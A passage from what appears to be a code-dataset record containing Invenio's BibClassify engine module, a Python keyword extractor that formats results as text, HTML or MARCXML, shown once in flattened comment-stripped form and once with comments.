composite_keywords_p=_sort_kw_matches(composite_keywords) for w in single_keywords_p: categories[w[0].concept]=w[0].type for w in single_keywords_p: categories[w[0].concept]=w[0].type complete_output=_output_complete(single_keywords_p, composite_keywords_p, author_keywords, acronyms, spires, only_core_tags, limit=output_limit) functions={\"text\": _output_text, \"marcxml\": _output_marc, \"html\": _output_html, \"dict\": _output_dict} my_styles={} for s in style: if s !=\"raw\": my_styles[s]=functions[s](complete_output, categories) else: if output_limit > 0: my_styles[\"raw\"]=(_kw(_sort_kw_matches(single_keywords, output_limit)), _kw(_sort_kw_matches(composite_keywords, output_limit)), author_keywords, _kw(_sort_kw_matches(acronyms, output_limit))) else: my_styles[\"raw\"]=(single_keywords_p, composite_keywords_p, author_keywords, acronyms) return my_styles def build_marc(recid, single_keywords, composite_keywords, spires=False, author_keywords=None, acronyms=None): \"\"\"Create xml record. :var recid: ingeter :var single_keywords: dictionary of kws :var composite_keywords: dictionary of kws :keyword spires: please don't use, left for historical reasons :keyword author_keywords: dictionary of extracted keywords :keyword acronyms: dictionary of extracted acronyms :return: str, marxml \"\"\" output=['<collection><record>\\n' '<controlfield tag=\"001\">%s</controlfield>' % recid] single_keywords=single_keywords.items() composite_keywords=composite_keywords.items() output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms)) output.append('</record></collection>') return '\\n'.join(output) def _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD, auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD, provenience='BibClassify'): \"\"\"Output the keywords in the MARCXML format. :var skw_matches: list of single keywords :var ckw_matches: list of composite keywords :var author_keywords: dictionary of extracted author keywords :var acronyms: dictionary of acronyms :var spires: boolean, True=generate spires output -BUT NOTE: it is here only not to break compatibility, in fact spires output should never be used for xml because if we read marc back into the KeywordToken objects, we would not find them :keyword provenience: string that identifies source(authority) that assigned the contents of the field :return: string, formatted MARC\"\"\" kw_template=('<datafield tag=\"%s\" ind1=\"%s\" ind2=\"%s\">\\n' ' <subfield code=\"2\">%s</subfield>\\n' ' <subfield code=\"a\">%s</subfield>\\n' ' <subfield code=\"n\">%s</subfield>\\n' ' <subfield code=\"9\">%s</subfield>\\n' '</datafield>\\n') output=[] tag, ind1, ind2=_parse_marc_code(kw_field) for keywords in(output_complete[\"Single keywords\"], output_complete[\"Core keywords\"]): for kw in keywords: output.append(kw_template %(tag, ind1, ind2, encode_for_xml(provenience), encode_for_xml(kw), keywords[kw], encode_for_xml(categories[kw]))) for field, keywords in((auth_field, output_complete[\"Author keywords\"]), (acro_field, output_complete[\"Acronyms\"])): if keywords and len(keywords) and field: tag, ind1, ind2=_parse_marc_code(field) for kw, info in keywords.items(): output.append(kw_template %(tag, ind1, ind2, encode_for_xml(provenience), encode_for_xml(kw), '', encode_for_xml(categories[kw]))) return \"\".join(output) def _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None, acronyms=None, spires=False, only_core_tags=False, limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER): if limit: resized_skw=skw_matches[0:limit] resized_ckw=ckw_matches[0:limit] else: resized_skw=skw_matches resized_ckw=ckw_matches results={\"Core keywords\": _get_core_keywords(skw_matches, ckw_matches, spires=spires)} if not only_core_tags: results[\"Author keywords\"]=_get_author_keywords(author_keywords, spires=spires) results[\"Composite keywords\"]=_get_compositekws(resized_ckw, spires=spires) results[\"Single keywords\"]=_get_singlekws(resized_skw, spires=spires) results[\"Field codes\"]=_get_fieldcodes(resized_skw, resized_ckw, spires=spires) results[\"Acronyms\"]=_get_acronyms(acronyms) return results def _output_dict(complete_output, categories): return{ \"complete_output\": complete_output, \"categories\": categories } def _output_text(complete_output, categories): \"\"\"Output the results obtained in text format. :return: str, html formatted output \"\"\" output=\"\" for result in complete_output: list_result=complete_output[result] if list_result: list_result_sorted=sorted(list_result, key=lambda x: list_result[x], reverse=True) output +=\"\\n\\n{0}:\\n\".format(result) for element in list_result_sorted: output +=\"\\n{0}{1}\".format(list_result[element], element) output +=\"\\n--\\n{0}\".format(_signature()) return output def _output_html(complete_output, categories): \"\"\"Output the same as txt output does, but HTML formatted. :var skw_matches: sorted list of single keywords :var ckw_matches: sorted list of composite keywords :var author_keywords: dictionary of extracted author keywords :var acronyms: dictionary of acronyms :var spires: boolean :var only_core_tags: boolean :keyword limit: int, number of printed keywords :return: str, html formatted output \"\"\" return \"\"\"<html> <head> <title>Automatically generated keywords by bibclassify</title> </head> <body> {0} </body> </html>\"\"\".format( _output_text(complete_output).replace('\\n', '<br>') ).replace('\\n', '') def _get_singlekws(skw_matches, spires=False): \"\"\" :var skw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: list of formatted keywords \"\"\" output={} for single_keyword, info in skw_matches: output[single_keyword.output(spires)]=len(info[0]) return output def _get_compositekws(ckw_matches, spires=False): \"\"\" :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: list of formatted keywords \"\"\" output={} for composite_keyword, info in ckw_matches: output[composite_keyword.output(spires)]={\"numbers\": len(info[0]), \"details\": info[1]} return output def _get_acronyms(acronyms): \"\"\"Return a formatted list of acronyms.\"\"\" acronyms_str={} if acronyms: for acronym, expansions in iteritems(acronyms): expansions_str=\", \".join([\"%s(%d)\" % expansion for expansion in expansions]) acronyms_str[acronym]=expansions_str return acronyms def _get_author_keywords(author_keywords, spires=False): \"\"\"Format the output for the author keywords. :return: list of formatted author keywors \"\"\" out={} if author_keywords: for keyword, matches in author_keywords.items(): skw_matches=matches[0] ckw_matches=matches[1] matches_str=[] for ckw, spans in ckw_matches.items(): matches_str.append(ckw.output(spires)) for skw, spans in skw_matches.items(): matches_str.append(skw.output(spires)) if matches_str: out[keyword]=matches_str else: out[keyword]=0 return out def _get_fieldcodes(skw_matches, ckw_matches, spires=False): \"\"\"Return the output for the field codes. :var skw_matches: dict of{keyword:[info,...]} :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: string\"\"\" fieldcodes={} output={} for skw, _ in skw_matches: for fieldcode in skw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires)) for ckw, _ in ckw_matches: if len(ckw.fieldcodes): for fieldcode in ckw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires)) else: for kw in ckw.getComponents(): for fieldcode in kw.fieldcodes: fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires)) fieldcodes.setdefault('*', set()).add(kw.output(spires)) for fieldcode, keywords in fieldcodes.items(): output[fieldcode]=', '.join(keywords) return output def _get_core_keywords(skw_matches, ckw_matches, spires=False): \"\"\"Return the output for the field codes. :var skw_matches: dict of{keyword:[info,...]} :var ckw_matches: dict of{keyword:[info,...]} :keyword spires: bool, to get the spires output :return: set of formatted core keywords \"\"\" output={} category={} def _get_value_kw(kw): \"\"\"Help to sort the Core keywords.\"\"\" i=0 while kw[i].isdigit(): i +=1 if i > 0: return int(kw[:i]) else: return 0 for skw, info in skw_matches: if skw.core: output[skw.output(spires)]=len(info[0]) category[skw.output(spires)]=skw.type for ckw, info in ckw_matches: if ckw.core: output[ckw.output(spires)]=len(info[0]) else: i=0 for c in ckw.getComponents(): if c.core: output[c.output(spires)]=info[1][i] i +=1 return output def _filter_core_keywors(keywords): matches={} for kw, info in keywords.items(): if kw.core: matches[kw]=info return matches def _signature(): \"\"\"Print out the bibclassify signature. return 'bibclassify v%s' %(bconfig.VERSION,) def clean_before_output(kw_matches): \"\"\"Return a clean copy of the keywords data structure. Stripped off the standalone and other unwanted elements\"\"\" filtered_kw_matches={} for kw_match, info in iteritems(kw_matches): if not kw_match.nostandalone: filtered_kw_matches[kw_match]=info return filtered_kw_matches def _skw_matches_comparator(kw0, kw1): \"\"\" Compare 2 single keywords objects. First by the number of their spans(ie. how many times they were found), if it is equal it compares them by lenghts of their labels. \"\"\" list_comparison=cmp(len(kw1[1][0]), len(kw0[1][0])) if list_comparison: return list_comparison if kw0[0].isComposite() and kw1[0].isComposite(): component_avg0=sum(kw0[1][1]) / len(kw0[1][1]) component_avg1=sum(kw1[1][1]) / len(kw1[1][1]) component_comparison=cmp(component_avg1, component_avg0) if component_comparison: return component_comparison return cmp(len(str(kw1[0])), len(str(kw0[0]))) def _kw(keywords): \"\"\"Turn list of keywords into dictionary.\"\"\" r={} for k, v in keywords: r[k]=v return r def _sort_kw_matches(skw_matches, limit=0): \"\"\"Return a resized version of keywords to the given length.\"\"\" sorted_keywords=list(skw_matches.items()) sorted_keywords.sort(_skw_matches_comparator) return limit and sorted_keywords[:limit] or sorted_keywords def _get_partial_text(fulltext): \"\"\" Return a short version of the fulltext used with the partial matching mode. The version is composed of 20% in the beginning and 20% in the middle of the text.\"\"\" length=len(fulltext) get_index=lambda x: int(float(x) / 100 * length) partial_text=[fulltext[get_index(start):get_index(end)] for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT] return \"\\n\".join(partial_text) def save_keywords(filename, xml): tmp_dir=os.path.dirname(filename) if not os.path.isdir(tmp_dir): os.mkdir(tmp_dir) file_desc=open(filename, \"w\") file_desc.write(xml) file_desc.close() def get_tmp_file(recid): tmp_directory=\"%s/bibclassify\" % bconfig.CFG_TMPDIR if not os.path.isdir(tmp_directory): os.mkdir(tmp_directory) filename=\"bibclassify_%s.xml\" % recid abs_path=os.path.join(tmp_directory, filename) return abs_path def _parse_marc_code(field): \"\"\"Parse marc field and return default indicators if not filled in.\"\"\" field=str(field) if len(field) < 4: raise Exception('Wrong field code: %s' % field) else: field +='__' tag=field[0:3] ind1=field[3].replace('_', '') ind2=field[4].replace('_', '') return tag, ind1, ind2 if __name__==\"__main__\": log.error(\"Please use bibclassify_cli from now on.\") ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2007, 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n#\n# Invenio is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 2 of the\n# License, or (at your option) any later version.\n#\n# Invenio is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Invenio; if not, write to the Free Software Foundation, Inc.,\n# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n\"\"\"\nBibClassify engine.\n\nThis module is the main module of BibClassify. its two main methods are\noutput_keywords_for_sources and get_keywords_from_text. The first one output\nkeywords for a list of sources (local files or URLs, PDF or text) while the\nsecond one outputs the keywords for text lines (which are obtained using the\nmodule bibclassify_text_normalizer).\n\nThis module also takes care of the different outputs (text, MARCXML or HTML).\nBut unfortunately there is a confusion between running in a standalone mode\nand producing output suitable for printing, and running in a web-based\nmode where the webtemplate is used. For the moment the pieces of the representation\ncode are left in this module.\n\"\"\"\n\nfrom __future__ import print_function\n\nimport os\nfrom six import iteritems\nimport config as bconfig\n\nfrom invenio.legacy.bibclassify import ontology_reader as reader\nimport text_extractor as extractor\nimport text_normalizer as normalizer\nimport keyword_analyzer as keyworder\nimport acronym_analyzer as acronymer\n\nfrom invenio.utils.url import make_user_agent_string\nfrom invenio.utils.text import encode_for_xml\n\nlog = bconfig.get_logger(\"bibclassify.engine\")\n\n# ---------------------------------------------------------------------\n#                          API\n# ---------------------------------------------------------------------\n\n\ndef output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\",\n                                output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,\n                                match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                rebuild_cache=False, only_core_tags=False, extract_acronyms=False,\n                                api=False, **kwargs):\n    \"\"\"Output the keywords for each source in sources.\"\"\"\n\n    # Inner function which does the job and it would be too much work to\n    # refactor the call (and it must be outside the loop, before it did\n    # not process multiple files)\n    def process_lines():\n        if output_mode == \"text\":\n            print(\"Input file: %s\" % source)\n\n        output = get_keywords_from_text(\n            text_lines,\n            taxonomy_name,\n            output_mode=output_mode,\n            output_limit=output_limit,\n            spires=spires,\n            match_mode=match_mode,\n            no_cache=no_cache,\n            with_author_keywords=with_author_keywords,\n            rebuild_cache=rebuild_cache,\n            only_core_tags=only_core_tags,\n            extract_acronyms=extract_acronyms\n        )\n        if api:\n            return output\n        else:\n            if isinstance(output, dict):\n                for i in output:\n                    print(output[i])\n\n    # Get the fulltext for each source.\n    for entry in input_sources:\n        log.info(\"Trying to read input file %s.\" % entry)\n        text_lines = None\n        source = \"\"\n        if os.path.isdir(entry):\n            for filename in os.listdir(entry):\n                if filename.startswith('.'):\n                    continue\n                filename = os.path.join(entry, filename)\n                if os.path.isfile(filename):\n                    text_lines = extractor.text_lines_from_local_file(filename)\n                    if text_lines:\n                        source = filename\n                        process_lines()\n        elif os.path.isfile(entry):\n            text_lines = extractor.text_lines_from_local_file(entry)\n            if text_lines:\n                source = os.path.basename(entry)\n                process_lines()\n        else:\n            # Treat as a URL.\n            text_lines = extractor.text_lines_from_url(entry,\n                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n            if text_lines:\n                source = entry.split(\"/\")[-1]\n                process_lines()\n\n\ndef get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\",\n                                 output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,\n                                 match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                 **kwargs):\n    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n    as for :see: get_keywords_from_text() \"\"\"\n\n    log.info(\"Analyzing keywords for local file %s.\" % local_file)\n    text_lines = extractor.text_lines_from_local_file(local_file)\n\n    return get_keywords_from_text(text_lines,\n                                  taxonomy_name,\n                                  output_mode=output_mode,\n                                  output_limit=output_limit,\n                                  spires=spires,\n                                  match_mode=match_mode,\n                                  no_cache=no_cache,\n                                  with_author_keywords=with_author_keywords,\n                                  rebuild_cache=rebuild_cache,\n                                  only_core_tags=only_core_tags,\n                                  extract_acronyms=extract_acronyms)\n\n\ndef get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n                           output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER,\n                           spires=False, match_mode=\"full\", no_cache=False,\n                           with_author_keywords=False, rebuild_cache=False,\n                           only_core_tags=False, extract_acronyms=False,\n                           **kwargs):\n    \"\"\"Extract keywords from the list of strings\n\n    :param text_lines: list of strings (will be normalized before being\n        joined into one string)\n    :param taxonomy_name: string, name of the taxonomy_name\n    :param output_mode: string - text|html|marcxml|raw\n    :param output_limit: int\n    :param spires: boolean, if True marcxml output reflect spires codes.\n    :param match_mode: str - partial|full; in partial mode only\n        beginning of the fulltext is searched.\n    :param no_cache: boolean, means loaded definitions will not be saved.\n    :param with_author_keywords: boolean, extract keywords from the pdfs.\n    :param rebuild_cache: boolean\n    :param only_core_tags: boolean\n    :return: if output_mode=raw, it will return\n        (single_keywords, composite_keywords, author_keywords, acronyms)\n        for other output modes it returns formatted string\n    \"\"\"\n\n    cache = reader.get_cache(taxonomy_name)\n    if not cache:\n        reader.set_cache(taxonomy_name,\n                         reader.get_regular_expressions(taxonomy_name,\n                                                        rebuild=rebuild_cache,\n                                                        no_cache=no_cache))\n        cache = reader.get_cache(taxonomy_name)\n    _skw = cache[0]\n    _ckw = cache[1]\n    text_lines = normalizer.cut_references(text_lines)\n    fulltext = normalizer.normalize_fulltext(\"\\n\".join(text_lines))\n\n    if match_mode == \"partial\":\n        fulltext = _get_partial_text(fulltext)\n    author_keywords = None\n    if with_author_keywords:\n        author_keywords = extract_author_keywords(_skw, _ckw, fulltext)\n    acronyms = {}\n    if extract_acronyms:\n        acronyms = extract_abbreviations(fulltext)\n\n    single_keywords = extract_single_keywords(_skw, fulltext)\n    composite_keywords = extract_composite_keywords(_ckw, fulltext, single_keywords)\n\n    if only_core_tags:\n        single_keywords = clean_before_output(_filter_core_keywors(single_keywords))\n        composite_keywords = _filter_core_keywors(composite_keywords)\n    else:\n        # Filter out the \"nonstandalone\" keywords\n        single_keywords = clean_before_output(single_keywords)\n    return get_keywords_output(single_keywords, composite_keywords, taxonomy_name,\n                               author_keywords, acronyms, output_mode, output_limit,\n                               spires, only_core_tags)\n\n\ndef extract_single_keywords(skw_db, fulltext):\n    \"\"\"Find single keywords in the fulltext\n    :var skw_db: list of KeywordToken objects\n    :var fulltext: string, which will be searched\n    :return : dictionary of matches in a format {\n            <keyword object>, [[position, position...], ],\n            ..\n            }\n            or empty {}\n    \"\"\"\n    return keyworder.get_single_keywords(skw_db, fulltext) or {}\n\n\ndef extract_composite_keywords(ckw_db, fulltext, skw_spans):\n    \"\"\"Returns a list of composite keywords bound with the number of\n    occurrences found in the text string.\n    :var ckw_db: list of KewordToken objects (they are supposed to be composite ones)\n    :var fulltext: string to search in\n    :skw_spans: dictionary of already identified single keywords\n    :return : dictionary of matches in a format {\n            <keyword object>, [[position, position...], [info_about_matches] ],\n            ..\n            }\n            or empty {}\n    \"\"\"\n    return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or {}\n\n\ndef extract_abbreviations(fulltext):\n    \"\"\"Extract acronyms from the fulltext\n    :var fulltext: utf-8 string\n    :return: dictionary of matches in a formt {\n          <keyword object>, [matched skw or ckw object, ....]\n          }\n          or empty {}\n    \"\"\"\n    acronyms = {}\n    K = reader.KeywordToken\n    for k, v in acronymer.get_acronyms(fulltext).items():\n        acronyms[K(k, type='acronym')] = v\n    return acronyms\n\n\ndef extract_author_keywords(skw_db, ckw_db, fulltext):\n    \"\"\"Finds out human defined keyowrds in a text string. Searches for\n    the string \"Keywords:\" and its declinations and matches the\n    following words.\n\n    :var skw_db: list single kw object\n    :var ckw_db: list of composite kw objects\n    :var fulltext: utf-8 string\n    :return: dictionary of matches in a formt {\n          <keyword object>, [matched skw or ckw object, ....]\n          }\n          or empty {}\n    \"\"\"\n    akw = {}\n    K = reader.KeywordToken\n    for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items():\n        akw[K(k, type='author-kw')] = v\n    return akw\n\n\n# ---------------------------------------------------------------------\n#                          presentation functions\n# ---------------------------------------------------------------------\n\n\ndef get_keywords_output(single_keywords, composite_keywords, taxonomy_name,\n                        author_keywords=None, acronyms=None, style=\"text\", output_limit=0,\n                        spires=False, only_core_tags=False):\n    \"\"\"Returns a formatted string representing the keywords according\n    to the chosen style. This is the main routing call, this function will\n    also strip unwanted keywords before output and limits the number\n    of returned keywords\n    :var single_keywords: list of single keywords\n    :var composite_keywords: list of composite keywords\n    :var taxonomy_name: string, taxonomy name\n    :keyword author_keywords: dictionary of author keywords extracted from fulltext\n    :keyword acronyms: dictionary of extracted acronyms\n    :keyword style: text|html|marc\n    :keyword output_limit: int, number of maximum keywords printed (it applies\n            to single and composite keywords separately)\n    :keyword spires: boolen meaning spires output style\n    :keyword only_core_tags: boolean\n    \"\"\"\n    categories = {}\n    # sort the keywords, but don't limit them (that will be done later)\n    single_keywords_p = _sort_kw_matches(single_keywords)\n\n    composite_keywords_p = _sort_kw_matches(composite_keywords)\n\n    for w in single_keywords_p:\n        categories[w[0].concept] = w[0].type\n    for w in single_keywords_p:\n        categories[w[0].concept] = w[0].type\n\n    complete_output = _output_complete(single_keywords_p, composite_keywords_p,\n                                       author_keywords, acronyms, spires,\n                                       only_core_tags, limit=output_limit)\n    functions = {\"text\": _output_text, \"marcxml\": _output_marc, \"html\":\n                 _output_html, \"dict\": _output_dict}\n    my_styles = {}\n\n    for s in style:\n        if s != \"raw\":\n            my_styles[s] = functions[s](complete_output, categories)\n        else:\n            if output_limit > 0:\n                my_styles[\"raw\"] = (_kw(_sort_kw_matches(single_keywords, output_limit)),\n                                    _kw(_sort_kw_matches(composite_keywords, output_limit)),\n                                    author_keywords,  # this we don't limit (?)\n                                    _kw(_sort_kw_matches(acronyms, output_limit)))\n            else:\n                my_styles[\"raw\"] = (single_keywords_p, composite_keywords_p, author_keywords, acronyms)\n\n    return my_styles\n\n\ndef build_marc(recid, single_keywords, composite_keywords,\n               spires=False, author_keywords=None, acronyms=None):\n    \"\"\"Create xml record.\n\n    :var recid: ingeter\n    :var single_keywords: dictionary of kws\n    :var composite_keywords: dictionary of kws\n    :keyword spires: please don't use, left for historical\n        reasons\n    :keyword author_keywords: dictionary of extracted keywords\n    :keyword acronyms: dictionary of extracted acronyms\n    :return: str, marxml\n    \"\"\"\n    output = ['<collection><record>\\n'\n              '<controlfield tag=\"001\">%s</controlfield>' % recid]\n\n    # no need to sort\n    single_keywords = single_keywords.items()\n    composite_keywords = composite_keywords.items()\n\n    output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms))\n\n    output.append('</record></collection>')\n\n    return '\\n'.join(output)\n\n\ndef _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD,\n                 auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD,\n                 provenience='BibClassify'):\n    \"\"\"Output the keywords in the MARCXML format.\n\n    :var skw_matches: list of single keywords\n    :var ckw_matches: list of composite keywords\n    :var author_keywords: dictionary of extracted author keywords\n    :var acronyms: dictionary of acronyms\n    :var spires: boolean, True=generate spires output - BUT NOTE: it is\n            here only not to break compatibility, in fact spires output\n            should never be used for xml because if we read marc back\n            into the KeywordToken objects, we would not find them\n    :keyword provenience: string that identifies source (authority) that\n        assigned the contents of the field\n    :return: string, formatted MARC\"\"\"\n\n    kw_template = ('<datafield tag=\"%s\" ind1=\"%s\" ind2=\"%s\">\\n'\n                   '    <subfield code=\"2\">%s</subfield>\\n'\n                   '    <subfield code=\"a\">%s</subfield>\\n'\n                   '    <subfield code=\"n\">%s</subfield>\\n'\n                   '    <subfield code=\"9\">%s</subfield>\\n'\n                   '</datafield>\\n')\n\n    output = []\n\n    tag, ind1, ind2 = _parse_marc_code(kw_field)\n    for keywords in (output_complete[\"Single keywords\"], output_complete[\"Core keywords\"]):\n        for kw in keywords:\n            output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),\n                                         encode_for_xml(kw), keywords[kw],\n                                         encode_for_xml(categories[kw])))\n\n    for field, keywords in ((auth_field, output_complete[\"Author keywords\"]),\n                            (acro_field, output_complete[\"Acronyms\"])):\n        if keywords and len(keywords) and field:  # field='' we shall not save the keywords\n            tag, ind1, ind2 = _parse_marc_code(field)\n            for kw, info in keywords.items():\n                output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),\n                                             encode_for_xml(kw), '', encode_for_xml(categories[kw])))\n\n    return \"\".join(output)\n\n\ndef _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None,\n                     acronyms=None, spires=False, only_core_tags=False,\n                     limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER):\n\n    if limit:\n        resized_skw = skw_matches[0:limit]\n        resized_ckw = ckw_matches[0:limit]\n    else:\n        resized_skw = skw_matches\n        resized_ckw = ckw_matches\n\n    results = {\"Core keywords\": _get_core_keywords(skw_matches, ckw_matches, spires=spires)}\n\n    if not only_core_tags:\n        results[\"Author keywords\"] = _get_author_keywords(author_keywords, spires=spires)\n        results[\"Composite keywords\"] = _get_compositekws(resized_ckw, spires=spires)\n        results[\"Single keywords\"] = _get_singlekws(resized_skw, spires=spires)\n        results[\"Field codes\"] = _get_fieldcodes(resized_skw, resized_ckw, spires=spires)\n        results[\"Acronyms\"] = _get_acronyms(acronyms)\n\n    return results\n\n\ndef _output_dict(complete_output, categories):\n    return {\n        \"complete_output\": complete_output,\n        \"categories\": categories\n    }\n\n\ndef _output_text(complete_output, categories):\n    \"\"\"Output the results obtained in text format.\n\n\n    :return: str, html formatted output\n    \"\"\"\n    output = \"\"\n\n    for result in complete_output:\n        list_result = complete_output[result]\n        if list_result:\n            list_result_sorted = sorted(list_result, key=lambda x: list_result[x],\n                                        reverse=True)\n            output += \"\\n\\n{0}:\\n\".format(result)\n            for element in list_result_sorted:\n                output += \"\\n{0} {1}\".format(list_result[element], element)\n\n    output += \"\\n--\\n{0}\".format(_signature())\n\n    return output\n\n\ndef _output_html(complete_output, categories):\n    \"\"\"Output the same as txt output does, but HTML formatted.\n\n    :var skw_matches: sorted list of single keywords\n    :var ckw_matches: sorted list of composite keywords\n    :var author_keywords: dictionary of extracted author keywords\n    :var acronyms: dictionary of acronyms\n    :var spires: boolean\n    :var only_core_tags: boolean\n    :keyword limit: int, number of printed keywords\n    :return: str, html formatted output\n    \"\"\"\n    return \"\"\"<html>\n    <head>\n      <title>Automatically generated keywords by bibclassify</title>\n    </head>\n    <body>\n    {0}\n    </body>\n    </html>\"\"\".format(\n        _output_text(complete_output).replace('\\n', '<br>')\n    ).replace('\\n', '')\n\n\ndef _get_singlekws(skw_matches, spires=False):\n    \"\"\"\n    :var skw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: list of formatted keywords\n    \"\"\"\n    output = {}\n    for single_keyword, info in skw_matches:\n        output[single_keyword.output(spires)] = len(info[0])\n    return output\n\n\ndef _get_compositekws(ckw_matches, spires=False):\n    \"\"\"\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: list of formatted keywords\n    \"\"\"\n    output = {}\n    for composite_keyword, info in ckw_matches:\n        output[composite_keyword.output(spires)] = {\"numbers\": len(info[0]),\n                                                    \"details\": info[1]}\n    return output\n\n\ndef _get_acronyms(acronyms):\n    \"\"\"Return a formatted list of acronyms.\"\"\"\n    acronyms_str = {}\n    if acronyms:\n        for acronym, expansions in iteritems(acronyms):\n            expansions_str = \", \".join([\"%s (%d)\" % expansion\n                                        for expansion in expansions])\n            acronyms_str[acronym] = expansions_str\n\n    return acronyms\n\n\ndef _get_author_keywords(author_keywords, spires=False):\n    \"\"\"Format the output for the author keywords.\n\n    :return: list of formatted author keywors\n    \"\"\"\n    out = {}\n    if author_keywords:\n        for keyword, matches in author_keywords.items():\n            skw_matches = matches[0]  # dictionary of single keywords\n            ckw_matches = matches[1]  # dict of composite keywords\n            matches_str = []\n            for ckw, spans in ckw_matches.items():\n                matches_str.append(ckw.output(spires))\n            for skw, spans in skw_matches.items():\n                matches_str.append(skw.output(spires))\n            if matches_str:\n                out[keyword] = matches_str\n            else:\n                out[keyword] = 0\n\n    return out\n\n\ndef _get_fieldcodes(skw_matches, ckw_matches, spires=False):\n    \"\"\"Return the output for the field codes.\n\n    :var skw_matches: dict of {keyword: [info,...]}\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: string\"\"\"\n    fieldcodes = {}\n    output = {}\n\n    for skw, _ in skw_matches:\n        for fieldcode in skw.fieldcodes:\n            fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires))\n    for ckw, _ in ckw_matches:\n\n        if len(ckw.fieldcodes):\n            for fieldcode in ckw.fieldcodes:\n                fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires))\n        else:  # inherit field-codes from the composites\n            for kw in ckw.getComponents():\n                for fieldcode in kw.fieldcodes:\n                    fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires))\n                    fieldcodes.setdefault('*', set()).add(kw.output(spires))\n\n    for fieldcode, keywords in fieldcodes.items():\n        output[fieldcode] = ', '.join(keywords)\n\n    return output\n\n\ndef _get_core_keywords(skw_matches, ckw_matches, spires=False):\n    \"\"\"Return the output for the field codes.\n\n    :var skw_matches: dict of {keyword: [info,...]}\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: set of formatted core keywords\n    \"\"\"\n    output = {}\n    category = {}\n\n    def _get_value_kw(kw):\n        \"\"\"Help to sort the Core keywords.\"\"\"\n        i = 0\n        while kw[i].isdigit():\n            i += 1\n        if i > 0:\n            return int(kw[:i])\n        else:\n            return 0\n\n    for skw, info in skw_matches:\n        if skw.core:\n            output[skw.output(spires)] = len(info[0])\n            category[skw.output(spires)] = skw.type\n    for ckw, info in ckw_matches:\n        if ckw.core:\n            output[ckw.output(spires)] = len(info[0])\n        else:\n            #test if one of the components is  not core\n            i = 0\n            for c in ckw.getComponents():\n                if c.core:\n                    output[c.output(spires)] = info[1][i]\n                i += 1\n    return output\n\n\ndef _filter_core_keywors(keywords):\n    matches = {}\n    for kw, info in keywords.items():\n        if kw.core:\n            matches[kw] = info\n    return matches\n\n\ndef _signature():\n    \"\"\"Print out the bibclassify signature.\n\n    #todo: add information about taxonomy, rdflib\"\"\"\n\n    return 'bibclassify v%s' % (bconfig.VERSION,)\n\n\ndef clean_before_output(kw_matches):\n    \"\"\"Return a clean copy of the keywords data structure.\n\n    Stripped off the standalone and other unwanted elements\"\"\"\n    filtered_kw_matches = {}\n\n    for kw_match, info in iteritems(kw_matches):\n        if not kw_match.nostandalone:\n            filtered_kw_matches[kw_match] = info\n\n    return filtered_kw_matches\n\n# ---------------------------------------------------------------------\n#                          helper functions\n# ---------------------------------------------------------------------\n\n\ndef _skw_matches_comparator(kw0, kw1):\n    \"\"\"\n    Compare 2 single keywords objects.\n\n    First by the number of their spans (ie. how many times they were found),\n    if it is equal it compares them by lenghts of their labels.\n    \"\"\"\n    list_comparison = cmp(len(kw1[1][0]), len(kw0[1][0]))\n    if list_comparison:\n        return list_comparison\n\n    if kw0[0].isComposite() and kw1[0].isComposite():\n        component_avg0 = sum(kw0[1][1]) / len(kw0[1][1])\n        component_avg1 = sum(kw1[1][1]) / len(kw1[1][1])\n        component_comparison = cmp(component_avg1, component_avg0)\n        if 